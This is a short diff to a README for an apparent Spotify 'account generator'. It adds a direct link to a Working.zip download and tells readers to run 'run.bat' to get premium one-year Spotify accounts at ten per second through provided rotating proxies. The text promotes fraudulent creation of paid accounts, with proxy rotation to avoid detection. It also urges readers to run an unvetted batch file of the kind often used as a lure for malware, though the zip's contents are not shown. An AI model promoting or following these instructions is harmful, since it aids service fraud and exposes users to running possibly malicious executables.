@@ -2,7 +2,7 @@
 
 # How to use
 
-Download zip from releases, run "run.bat", enter the thread count, and get premium spotify accounts ( 1 year plans )
+Download zip from [releases](https://github.com/Altify-Development/spotify-account-generator/releases/download/v1/Working.zip), run "run.bat", enter the thread count, and get premium spotify accounts ( 1 year plans )
 
 working 2023 auto premium spotify accounts 10/s using rotating proxies ( provided )
 
